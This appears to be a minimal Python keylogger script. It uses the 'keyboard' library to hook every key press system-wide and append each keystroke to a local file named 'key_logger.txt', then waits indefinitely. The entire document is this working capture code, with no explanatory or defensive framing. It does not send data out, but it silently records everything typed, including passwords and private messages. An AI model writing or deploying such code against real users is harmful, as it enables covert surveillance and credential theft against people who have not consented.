import keyboard

def on_press(key):
    with open("key_logger.txt", "a") as f:
        f.write(str(key))

keyboard.on_press(on_press)
keyboard.wait()
